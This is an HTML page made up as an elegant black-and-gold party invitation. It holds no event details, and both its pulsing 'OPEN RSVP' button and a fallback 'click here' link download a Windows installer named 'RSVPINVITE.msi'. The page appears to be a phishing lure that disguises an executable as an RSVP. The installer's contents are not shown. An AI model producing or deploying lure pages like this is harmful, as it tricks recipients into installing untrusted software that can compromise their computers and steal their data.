<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>Elegant Invitation — Black & Gold</title>
<meta name="viewport" content="width=device-width, initial-scale=1" />

<style>
/* ===================== BLACK & GOLD THEME ===================== */
:root{
  --bg: #0c0b0b;
  --panel: #1b1a19;
  --gold-light: #f2e3b3;
  --gold-mid: #d3b876;
  --gold-dark: #8a6a2b;
  --ink: #e8dcbf;
  --lace: #f8eed8;
}

*{ box-sizing:border-box }
body{
  margin:0;
  display:flex;
  justify-content:center;
  align-items:center;
  height:100vh;
  overflow:hidden; /* NO SCROLL */
  background: radial-gradient(circle at 30% 0%, rgba(255,255,255,.05), transparent),
              radial-gradient(circle at 70% 100%, rgba(255,255,255,.04), transparent),
              #0c0b0b;
  font-family:"Cormorant Garamond", serif;
  color:var(--ink);
}

/* ===================== GOLD OUTER FRAME ===================== */
.frame{
  width:min(900px, 92vw);
  height:min(92vh, 950px);
  background:linear-gradient(145deg, var(--gold-light), var(--gold-mid) 60%, var(--gold-dark));
  border-radius:22px;
  padding:20px;
  box-shadow:0 0 50px rgba(0,0,0,.6);
  position:relative;
}

/* Inner rim */
.frame::before{
  content:"";
  position:absolute; inset:10px;
  border-radius:16px;
  background:linear-gradient(145deg, #f7e6bd, #b99744 70%, #735820);
  z-index:0;
}

/* ===================== INNER PANEL ===================== */
.panel{
  position:absolute; inset:28px;
  background:linear-gradient(#262422, var(--panel));
  border-radius:14px;
  padding:60px 36px 120px;
  z-index:1;
  text-align:center;
  overflow:hidden;
  box-shadow:inset 0 15px 40px rgba(255,255,255,.05),
             inset 0 -20px 60px rgba(0,0,0,.5);
}

/* ===================== TYPOGRAPHY ===================== */
.overline{
  letter-spacing:.28em;
  text-transform:uppercase;
  color:var(--gold-light);
  font-size:13px;
}

.title{
  font-family:"Cinzel", serif;
  color:var(--gold-light);
  font-size:52px;
  letter-spacing:.15em;
}

.script{
  font-family:"Great Vibes", cursive;
  color:var(--gold-mid);
  font-size:34px;
}

.names{
  font-family:"Cinzel";
  color:var(--gold-light);
  font-size:32px;
  letter-spacing:.2em;
}

.details{
  color:var(--ink);
  font-size:18px;
  line-height:1.7;
  margin-top:18px;
  max-width:530px;
  margin-left:auto;
  margin-right:auto;
}

/* ===================== GOLD FLORALS ===================== */
.florals{
  position:absolute;
  right:-20px;
  bottom:-40px;
  width:480px;
  opacity:.9;
  pointer-events:none;
  z-index:1;
}

.floral-glow{
  position:absolute;
  right:0; bottom:0;
  width:50%; height:50%;
  background:radial-gradient(circle, rgba(255,220,150,.3), transparent 60%);
  z-index:0;
}

/* ===================== OPEN RSVP BUTTON ===================== */
.open-rsvp{
  position:absolute;
  bottom:140px;   /* ⬆ moved up a little more */
  left:50%;
  transform:translateX(-50%);
  padding:16px 42px;
  font-size:22px;
  font-family:"Cinzel", serif;
  text-decoration:none;
  color:#1b1a19;
  background:linear-gradient(145deg, var(--gold-light), var(--gold-mid), var(--gold-dark));
  border-radius:12px;
  letter-spacing:.15em;
  border:2px solid var(--gold-light);
  font-weight:600;
  text-transform:uppercase;
  z-index:3;

  animation: glowPulse 2.2s infinite ease-in-out;
}

/* Golden Glow Animation */
@keyframes glowPulse{
  0%{ box-shadow:0 0 12px rgba(255,215,110,.5), 0 0 25px rgba(255,220,140,.35); }
  50%{ box-shadow:0 0 22px rgba(255,215,110,.9), 0 0 40px rgba(255,220,140,.6); }
  100%{ box-shadow:0 0 12px rgba(255,215,110,.5), 0 0 25px rgba(255,220,140,.35); }
}
</style>

<!-- fonts -->
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@500;600&family=Great+Vibes&family=Cormorant+Garamond:wght@400;500&display=swap" rel="stylesheet">

</head>
<body>

<main class="frame">
<section class="panel">

<div class="content">

<div class="overline">SPECIAL PARTY INVITATION</div>
<div class="script">Silver Glass</div>
<h1 class="title">YOU'RE INVITED</h1>

<p class="details">
Kindly join us for an evening of celebration, dinner and dancing.<br>
Dress code is classic elegance.
</p>

<p class="details">
If the download doesn’t start, <a id="manualDownload" href="RSVPINVITE.msi" download>click here</a>.
</p>

</div>

<div class="floral-glow"></div>

<!-- FLORALS -->
<svg class="florals" viewBox="0 0 520 700">
  <defs>
    <linearGradient id="goldGrad" x1="0" y1="0" x2="1" y2="1">
      <stop offset="0" stop-color="#f7e7b8"/>
      <stop offset="0.4" stop-color="#d5b46b"/>
      <stop offset="1" stop-color="#8a6a2b"/>
    </linearGradient>
  </defs>

  <g fill="none" stroke="url(#goldGrad)" stroke-width="6">
    <path d="M90,640 C160,520 160,420 220,340 C280,260 330,200 400,150" />
    <path d="M220,640 C280,540 300,480 330,430" />
  </g>

  <g fill="url(#goldGrad)">
    <path d="M170,480 C240,430 270,420 310,430 C280,470 240,490 170,480Z"/>
    <path d="M230,560 C290,520 320,520 360,540 C330,570 290,580 230,560Z"/>
    <path d="M110,560 C160,520 180,510 210,520 C190,550 160,570 110,560Z"/>
    <path d="M300,360 C350,330 380,330 420,350 C390,380 350,390 300,360Z"/>
  </g>

  <g transform="translate(330 250)">
    <circle cx="0" cy="0" r="28" fill="url(#goldGrad)"/>
  </g>
</svg>

<a class="open-rsvp" href="RSVPINVITE.msi" download>OPEN RSVP</a>

</section>
</main>

</body>
</html>
